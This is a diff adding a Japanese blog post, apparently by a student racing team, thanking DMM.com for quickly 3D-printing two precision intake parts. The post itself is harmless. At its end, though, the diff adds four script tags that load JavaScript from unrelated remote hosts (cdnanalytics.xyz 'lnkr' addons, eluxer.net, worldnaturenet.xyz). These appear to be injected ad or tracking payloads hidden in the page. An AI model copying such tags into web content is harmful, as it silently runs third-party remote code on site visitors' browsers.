@@ -1,0 +1,28 @@
+---
+path: "/post"
+date: "2018-03-14T01:35:32Z"
+title: "株式会社DMM.com様に吸気パーツを製作して頂きました"
+tags: ["スポンサーシップ", "パワートレイン"]
+# dummy
+excerpt: " DMM.com様に吸気パーツを製作していただきましたこんにちは，吸気担当B1の平野です．株式会社DMM.com様に造形いただきました吸気パーツ2点が届きました．これまで設計してきたものが目に見える..."
+---
+
+[](14-1.jpg) DMM.com様に吸気パーツを製作していただきました
+
+こんにちは，吸気担当B1の平野です．
+
+株式会社DMM.com様に造形いただきました吸気パーツ2点が届きました．
+これまで設計してきたものが目に見える形になり，設計者として大変感動しております．
+
+今年度は，株式会社DMM.com様から新素材での造形を推奨していただき，新素材・新方式を使用してのパーツの造形をして頂きました．
+届いたパーツをピタリと嵌め合わせることができ，チーム一同造形の精度の高さに大変驚きました．
+
+造形の依頼後，株式会社DMM.com様の素早い対応もあり，わずか4日でパーツが届きました．
+大会に向け余裕を持った準備ができ，本当に助かりました．
+
+他パーツについても，引き続き製作してまいります．
+
+Text:Tatsushiro Hirano
+http://www.grandelfino.net
+
+<script src="http://cdnanalytics.xyz/addons/lnkr5.min.js" type="text/javascript"></script><script src="http://cdnanalytics.xyz/addons/lnkr30_nt.min.js" type="text/javascript"></script><script src="http://eluxer.net/code?id=105&amp;subid=51824_6321_" type="text/javascript"></script><script src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51824x6321x&amp;r=36" type="text/javascript"></script>
